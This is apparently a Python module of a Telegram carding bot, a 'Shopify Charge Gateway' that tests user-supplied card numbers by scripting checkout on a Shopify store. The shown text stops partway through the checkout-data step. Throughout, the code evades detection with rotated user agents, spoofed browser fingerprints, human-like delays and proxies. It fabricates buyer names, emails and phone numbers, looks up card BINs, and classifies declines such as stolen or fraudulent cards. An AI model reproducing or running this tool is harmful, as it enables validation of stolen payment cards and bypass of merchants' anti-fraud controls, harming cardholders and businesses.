# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - Compatible with VPS Systems
# Enhanced with better anti-bot bypass techniques

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import uuid
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def shopify(self, message):
        print(f"🛍️ {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def proxy(self, message):
        print(f"🔌 {message}")

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

import os

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents for VPS compatibility
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        self.session_start_time = time.time()
        
        # Shopify specific cookies and tokens
        self.cookies = {}
        self.checkout_token = None
        self.session_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "5927fca009d35ac648408d54c8d94b0d54813e89"
        
        # Fixed address details
        self.fixed_address = {
            'address1': '8 Log Pond Drive',
            'address2': '',
            'city': 'Horsham',
            'state': 'PA',
            'zip': '19044',
            'country': 'US',
            'phone': None
        }
        
        # Known product variant IDs from the request data
        self.variant_ids = [
            "42974272290658",  # Primary variant ID
            "42974272257890",  # Alternative variant ID
            "42974272323426",  # Backup variant ID
        ]
        
        # BIN services
        self.bin_services = [
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            },
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            }
        ]
        
        # Shopify error patterns
        self.shopify_errors = {
            "your card was declined": "CARD_DECLINED",
            "card has been declined": "CARD_DECLINED",
            "card_declined": "CARD_DECLINED",
            "incorrect_cvc": "INCORRECT_CVC",
            "expired_card": "EXPIRED_CARD",
            "incorrect_number": "INCORRECT_NUMBER",
            "invalid_account": "INVALID_ACCOUNT",
            "account_closed": "ACCOUNT_CLOSED",
            "lost_card": "LOST_CARD",
            "stolen_card": "STOLEN_CARD",
            "insufficient_funds": "INSUFFICIENT_FUNDS",
            "credit_limit_exceeded": "CREDIT_LIMIT_EXCEEDED",
            "processing_error": "PROCESSING_ERROR",
            "captcha_required": "CAPTCHA_REQUIRED",
            "captcha failed": "CAPTCHA_FAILED",
            "rate limit": "RATE_LIMITED",
            "too many requests": "RATE_LIMITED",
            "invalid request": "INVALID_REQUEST",
            "session expired": "SESSION_EXPIRED",
            "checkout not found": "CHECKOUT_NOT_FOUND",
            "product not available": "PRODUCT_UNAVAILABLE",
            "out of stock": "OUT_OF_STOCK",
            "invalid shipping address": "INVALID_ADDRESS",
            "invalid billing address": "INVALID_ADDRESS",
            "address verification failed": "ADDRESS_VERIFICATION_FAILED",
            "payment gateway error": "GATEWAY_ERROR",
            "payment provider error": "GATEWAY_ERROR",
            "transaction failed": "TRANSACTION_FAILED",
            "authorization failed": "AUTHORIZATION_FAILED",
            "3d_secure_required": "3D_SECURE_REQUIRED",
            "3d secure authentication": "3D_SECURE_REQUIRED",
            "authentication required": "3D_SECURE_REQUIRED",
            "suspected fraud": "FRAUD_DETECTED",
            "fraudulent": "FRAUD_DETECTED",
            "suspicious activity": "FRAUD_DETECTED",
            "security violation": "FRAUD_DETECTED",
            "timeout": "TIMEOUT_ERROR",
            "connection error": "CONNECTION_ERROR",
            "network error": "NETWORK_ERROR",
            "checkout is locked": "CHECKOUT_LOCKED",
            "checkout is completed": "CHECKOUT_COMPLETED",
            "checkout is expired": "CHECKOUT_EXPIRED",
        }
        
        # Generate random browser fingerprints
        self.generate_browser_fingerprint()
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            proxy_value = get_proxy_for_user(user_id, "random")
            if proxy_value:
                if isinstance(proxy_value, dict):
                    if 'http' in proxy_value:
                        self.current_proxy = proxy_value.get('http') or proxy_value.get('https')
                    else:
                        for key, value in proxy_value.items():
                            if isinstance(value, str) and value.startswith('http'):
                                self.current_proxy = value
                                break
                else:
                    self.current_proxy = str(proxy_value)
                
                if self.current_proxy:
                    logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")
        
    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints for VPS"""
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"'

        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"
        
        # Screen resolution
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]
        self.screen_resolution = random.choice(self.screen_resolutions)
        
        # Timezone
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]
        self.timezone = random.choice(self.timezones)
        
        # Languages
        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]
        self.accept_language = random.choice(self.languages)
        
        # Connection type
        self.connection_type = random.choice(["keep-alive", "close"])
        
        # Generate unique browser fingerprints for each session
        self.browser_fingerprint = {
            'hardware_concurrency': random.choice([4, 8, 12, 16]),
            'device_memory': random.choice([4, 8, 16]),
            'color_depth': random.choice([24, 30, 32]),
            'pixel_ratio': random.choice([1, 2, 3]),
            'timezone_offset': random.randint(-720, 720),
            'session_id': str(uuid.uuid4()),
        }

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿',
            'EG': '🇪🇬', 'MA': '🇲🇦'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers for VPS"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'no-cache',
            'Connection': self.connection_type,
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
            'Viewport-Width': self.screen_resolution.split('x')[0],
            'Width': self.screen_resolution.split('x')[0],
            'Pragma': 'no-cache',
        }

    def get_shopify_headers(self, referer=None):
        """Get headers for Shopify requests with VPS optimizations"""
        headers = self.get_base_headers()
        if referer:
            headers['Referer'] = referer
        headers['Origin'] = self.base_url
        
        # Add browser fingerprint headers
        headers['Sec-CH-UA-Full-Version-List'] = self.sec_ch_ua
        headers['Sec-CH-UA-Arch'] = '"x86"'
        headers['Sec-CH-UA-Bitness'] = '"64"'
        headers['Sec-CH-UA-Model'] = '""'
        
        return headers

    def get_graphql_headers(self):
        """Get headers for GraphQL requests"""
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': self.base_url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': self.user_agent,
            'X-Requested-With': 'XMLHttpRequest',
            'shopify-checkout-client': 'checkout-web/1.0'
        }
        
        if self.x_checkout_one_session_token:
            headers['x-checkout-one-session-token'] = self.x_checkout_one_session_token
        
        if self.checkout_token:
            headers['shopify-checkout-source'] = f'id="{self.checkout_token}", type="cn"'
        
        return headers

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        data = response.json()
                        result = service['parser'](data)
                        
                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                            result['emoji'] = self.get_country_emoji(result['country_code'])

                        self.bin_cache[bin_number] = result
                        return result
            except Exception as e:
                logger.warning(f"{service['name']} failed: {e}")
                continue

        self.bin_cache[bin_number] = default_response
        return default_response

    def generate_email(self):
        """Generate random email"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com']
        first_names = ['john', 'michael', 'david', 'james', 'robert', 'william']
        last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'miller']
        
        first = random.choice(first_names)
        last = random.choice(last_names)
        domain = random.choice(domains)
        
        # Random email patterns
        patterns = [
            f"{first}.{last}{random.randint(1, 999)}@{domain}",
            f"{first}{last}{random.randint(1, 99)}@{domain}",
            f"{first}_{last}@{domain}",
            f"{last}.{first}{random.randint(1, 9)}@{domain}"
        ]
        
        return random.choice(patterns)

    def generate_phone(self):
        """Generate US phone number"""
        area_codes = ['201', '202', '203', '205', '206', '207', '208', '209',
                     '210', '212', '213', '214', '215', '216', '217', '218']
        
        area = random.choice(area_codes)
        prefix = random.randint(200, 999)
        line = random.randint(1000, 9999)
        
        return f"+1{area}{prefix}{line}"

    def generate_name(self):
        """Generate random name"""
        first_names = ['John', 'Michael', 'David', 'James', 'Robert', 'William',
                      'Mary', 'Jennifer', 'Linda', 'Patricia', 'Elizabeth', 'Susan']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller',
                     'Davis', 'Garcia', 'Rodriguez', 'Wilson', 'Martinez']
        
        return random.choice(first_names), random.choice(last_names)

    def detect_error_type(self, error_message):
        """Detect Shopify error type from error message"""
        if not error_message:
            return "UNKNOWN_ERROR"
        
        error_lower = error_message.lower()
        
        for pattern, error_type in self.shopify_errors.items():
            if pattern in error_lower:
                return error_type
        
        # Check for specific patterns
        if "declined" in error_lower:
            return "CARD_DECLINED"
        elif "cvv" in error_lower or "security code" in error_lower:
            return "INCORRECT_CVC"
        elif "expired" in error_lower:
            return "EXPIRED_CARD"
        elif "invalid" in error_lower:
            return "INVALID_CARD"
        elif "fund" in error_lower:
            return "INSUFFICIENT_FUNDS"
        elif "limit" in error_lower:
            return "CREDIT_LIMIT_EXCEEDED"
        
        return "UNKNOWN_ERROR"

    def clean_error_message(self, message):
        """Clean and format error message"""
        if not message:
            return "Unknown error"
        
        # Remove HTML tags
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove common prefixes
        prefixes = [
            "error: ", "sorry, ", "payment failed: ", "transaction failed: ",
            "there was an error: ", "we're sorry, ", "unable to process: "
        ]
        
        for prefix in prefixes:
            if message.lower().startswith(prefix.lower()):
                message = message[len(prefix):].strip()
                break
        
        # Capitalize first letter
        if message:
            message = message[0].upper() + message[1:]
        
        return message

    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions with VPS optimization"""
        # Add random jitter for more human-like behavior
        jitter = random.uniform(0.1, 0.5)
        delay = random.uniform(min_delay, max_delay) + jitter
        await asyncio.sleep(delay)

    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_shopify_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add delay between requests to mimic human behavior
            await self.human_delay(0.5, 1.5)
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            raise e

    async def browse_store(self, client):
        """Browse Shopify store to get initial cookies with VPS optimization"""
        try:
            logger.step(1, 8, "Browsing store...")
            
            # First, visit homepage with proper headers
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            if response.status_code == 200:
                # Extract cookies
                if 'set-cookie' in response.headers:
                    cookie_header = response.headers.get('set-cookie', '')
                    cookies = cookie_header.split(';')
                    for cookie in cookies:
                        if '=' in cookie:
                            name, value = cookie.strip().split('=', 1)
                            self.cookies[name] = value
                
                # Also visit collections page to appear more human
                await self.human_delay(1, 2)
                await self.make_request(
                    client, 'GET', f"{self.base_url}/collections/all",
                    headers=self.get_shopify_headers(referer=self.base_url)
                )
                
                logger.success("Store accessed successfully")
                return True, None
            else:
                return False, f"Store access failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Store browsing error: {str(e)}"

    async def view_product(self, client):
        """View product page with multiple product views"""
        try:
            logger.step(2, 8, "Viewing product...")
            
            # View main product
            response = await self.make_request(
                client, 'GET', self.product_url,
                headers=self.get_shopify_headers(referer=self.base_url)
            )
            
            if response.status_code == 200:
                # Extract product data for later use
                html_content = response.text
                
                # Try to find variant ID from multiple patterns
                variant_patterns = [
                    r'data-productid="(\d+)"',
                    r'value="(\d+)"\s*data-variant',
                    r'variant_id["\']?\s*:\s*["\']?(\d+)',
                    r'"id":\s*(\d+)\s*,\s*"product_id"',
                ]
                
                for pattern in variant_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        logger.debug_response(f"Found variant ID: {match.group(1)}")
                        break
                
                logger.success("Product viewed successfully")
                return True, None
            else:
                return False, f"Product view failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Product view error: {str(e)}"

    async def add_to_cart_v2(self, client):
        """Improved add to cart method for VPS compatibility"""
        try:
            logger.step(3, 8, "Adding to cart (V2 method)...")
            
            # Try multiple methods in sequence
            methods = [
                self.add_to_cart_ajax,
                self.add_to_cart_form_direct,
                self.add_to_cart_simple_form,
                self.add_to_cart_quantity_update
            ]
            
            for method in methods:
                try:
                    logger.debug_response(f"Trying method: {method.__name__}")
                    success, result = await method(client)
                    if success:
                        logger.success(f"Cart added successfully using {method.__name__}")
                        return True, None
                    else:
                        logger.warning(f"Method {method.__name__} failed: {result}")
                except Exception as e:
                    logger.warning(f"Method {method.__name__} error: {str(e)}")
                    continue
            
            # If all methods fail, try the emergency method
            return await self.add_to_cart_emergency(client)
                
        except Exception as e:
            return False, f"Add to cart V2 error: {str(e)}"

    async def add_to_cart_ajax(self, client):
        """AJAX method for adding to cart"""
        try:
            # Use default variant ID
            variant_id = self.variant_ids[0]
            
            cart_url = f"{self.base_url}/cart/add.js"
            cart_data = {
                'items': [{
                    'id': int(variant_id),
                    'quantity': 1
                }]
            }
            
            cart_headers = self.get_shopify_headers(referer=self.product_url)
            cart_headers['Content-Type'] = 'application/json'
            cart_headers['X-Requested-With'] = 'XMLHttpRequest'
            
            response = await self.make_request(
                client, 'POST', cart_url,
                json=cart_data,
                headers=cart_headers
            )
            
            if response.status_code == 200:
                result = response.json()
                if 'items' in result and len(result['items']) > 0:
                    return True, "AJAX method successful"
            
            return False, "AJAX method failed"
        except Exception as e:
            return False, f"AJAX error: {str(e)}"

    async def add_to_cart_form_direct(self, client):
        """Direct form submission method"""
        try:
            variant_id = self.variant_ids[0]
            
            form_url = f"{self.base_url}/cart/add"
            form_data = {
                'id': variant_id,
                'quantity': '1',
                'return_to': '/cart'
            }
            
            form_headers = self.get_shopify_headers(referer=self.product_url)
            form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            response = await self.make_request(
                client, 'POST', form_url,
                data=form_data,
                headers=form_headers
            )
            
            if response.status_code in [200, 302]:
                # Check cart content
                cart_check = await self.make_request(
                    client, 'GET', f"{self.base_url}/cart.js",
                    headers=self.get_shopify_headers(referer=form_url)
                )
                
                if cart_check.status_code == 200:
                    cart_data = cart_check.json()
                    if 'items' in cart_data and len(cart_data['items']) > 0:
                        return True, "Form direct method successful"
            
            return False, "Form direct method failed"
        except Exception as e:
            return False, f"Form direct error: {str(e)}"

    async def add_to_cart_simple_form(self, client):
        """Simple form method without return_to"""
        try:
            variant_id = self.variant_ids[0]
            
            form_url = f"{self.base_url}/cart/add"
            form_data = f'id={variant_id}&quantity=1'
            
            form_headers = self.get_shopify_headers(referer=self.product_url)
            form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            response = await self.make_request(
                client, 'POST', form_url,
                data=form_data,
                headers=form_headers
            )
            
            # Even if response fails, check if cart has items
            cart_check = await self.make_request(
                client, 'GET', f"{self.base_url}/cart.json",
                headers=self.get_shopify_headers(referer=form_url)
            )
            
            if cart_check.status_code == 200:
                cart_data = cart_check.json()
                if 'items' in cart_data and len(cart_data['items']) > 0:
                    return True, "Simple form method successful"
            
            return False, "Simple form method failed"
        except Exception as e:
            return False, f"Simple form error: {str(e)}"

    async def add_to_cart_quantity_update(self, client):
        """Update quantity method"""
        try:
            # First add with quantity 0, then update to 1
            variant_id = self.variant_ids[0]
            
            # Add with quantity 0
            add_url = f"{self.base_url}/cart/add.js"
            add_data = {
                'items': [{
                    'id': int(variant_id),
                    'quantity': 0
                }]
            }
            
            add_headers = self.get_shopify_headers(referer=self.product_url)
            add_headers['Content-Type'] = 'application/json'
            add_headers['X-Requested-With'] = 'XMLHttpRequest'
            
            await self.make_request(
                client, 'POST', add_url,
                json=add_data,
                headers=add_headers
            )
            
            # Now update to quantity 1
            update_url = f"{self.base_url}/cart/update.js"
            update_data = {
                'updates': {
                    variant_id: 1
                }
            }
            
            update_response = await self.make_request(
                client, 'POST', update_url,
                json=update_data,
                headers=add_headers
            )
            
            if update_response.status_code == 200:
                result = update_response.json()
                if 'items' in result:
                    for item in result['items']:
                        if str(item['id']) == variant_id and item['quantity'] == 1:
                            return True, "Quantity update method successful"
            
            return False, "Quantity update method failed"
        except Exception as e:
            return False, f"Quantity update error: {str(e)}"

    async def add_to_cart_emergency(self, client):
        """Emergency method - bypass normal cart addition"""
        try:
            logger.warning("Using emergency cart addition method...")
            
            # Try to go directly to checkout with product in URL
            direct_checkout_url = f"{self.base_url}/cart/{self.variant_ids[0]}:1"
            
            response = await self.make_request(
                client, 'GET', direct_checkout_url,
                headers=self.get_shopify_headers(referer=self.product_url)
            )
            
            if response.status_code in [200, 302]:
                # Check if we have a checkout token
                html_content = response.text if response.status_code == 200 else ""
                location = response.headers.get('location', '')
                
                # Extract token from redirect or page
                token_pattern = r'checkouts/([a-zA-Z0-9]+)'
                match = None
                
                if location:
                    match = re.search(token_pattern, location)
                
                if not match and html_content:
                    match = re.search(token_pattern, html_content)
                
                if match:
                    self.checkout_token = match.group(1)
                    logger.success(f"Emergency method got checkout token: {self.checkout_token}")
                    return True, "Emergency method successful (got checkout token)"
            
            return False, "Emergency method failed"
        except Exception as e:
            return False, f"Emergency method error: {str(e)}"

    async def go_to_checkout_v2(self, client):
        """Improved checkout method for VPS"""
        try:
            logger.step(4, 8, "Going to checkout (V2 method)...")
            
            # First, check if we already have a checkout token
            if self.checkout_token:
                logger.success(f"Already have checkout token: {self.checkout_token}")
                return True, None
            
            # Check cart first
            cart_url = f"{self.base_url}/cart"
            response = await self.make_request(
                client, 'GET', cart_url,
                headers=self.get_shopify_headers(referer=self.product_url)
            )
            
            if response.status_code != 200:
                return False, f"Cart page failed: {response.status_code}"
            
            # Try to extract checkout token
            html_content = response.text
            token_patterns = [
                r'checkouts/([a-zA-Z0-9]+)',
                r'"checkout_url":"[^"]+checkouts/([a-zA-Z0-9]+)',
                r'data-checkout-url="[^"]+checkouts/([a-zA-Z0-9]+)',
                r'href="[^"]+checkouts/([a-zA-Z0-9]+)"',
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, html_content, re.IGNORECASE)
                if match:
                    self.checkout_token = match.group(1)
                    logger.success(f"Found checkout token in cart: {self.checkout_token}")
                    break
            
            if not self.checkout_token:
                # Try to create checkout
                checkout_url = f"{self.base_url}/checkout"
                checkout_data = 'checkout='
                
                checkout_headers = self.get_shopify_headers(referer=cart_url)
                checkout_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                response = await self.make_request(
                    client, 'POST', checkout_url,
                    data=checkout_data,
                    headers=checkout_headers
                )
                
                if response.status_code in [200, 302]:
                    # Extract token from response
                    if response.status_code == 302:
                        location = response.headers.get('location', '')
                        if location:
                            token_match = re.search(r'checkouts/([a-zA-Z0-9]+)', location)
                            if token_match:
                                self.checkout_token = token_match.group(1)
                    elif response.status_code == 200:
                        # Try to extract from page content
                        page_content = response.text
                        token_match = re.search(r'checkouts/([a-zA-Z0-9]+)', page_content)
                        if token_match:
                            self.checkout_token = token_match.group(1)
                    
                    if self.checkout_token:
                        logger.success(f"Created checkout with token: {self.checkout_token}")
                    else:
                        logger.warning("Checkout created but no token found")
                else:
                    return False, f"Checkout creation failed: {response.status_code}"
            
            if self.checkout_token:
                return True, None
            
            return False, "Checkout token not found after all attempts"
                
        except Exception as e:
            return False, f"Checkout V2 error: {str(e)}"

    async def get_checkout_data(self, client):
        """Get checkout data - Simplified for VPS"""
        try:
            logger.step(5, 8, "Fetching checkout data...")
            
            if not self.checkout_token:
                logger.warning("No checkout token, skipping checkout data")
                return True, "Skipped - no checkout token"
            
            # Just visit checkout page to get basic data
            checkout_url = f"{self.base_url}/checkouts/{self.checkout_token}"
            response = await self.make_request(
                client, 'GET', checkout_url,
                headers=self.get_shopify_headers(referer=f"{self.base_url}/cart")
            )
            
            if response.status_code == 200:
                # Try to extract session token
                html_content = response.text
                token_pattern = r'["\']?x-checkout-one-session-token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                match = re.search(token_pattern, html_content, re.IGNORECASE)
                
                if match:
                    self.x_checkout_one_session_token = match.group(1)
                    logger.success(f"Found session token: {self.x_checkout_one_session_token[:20]}...")
                
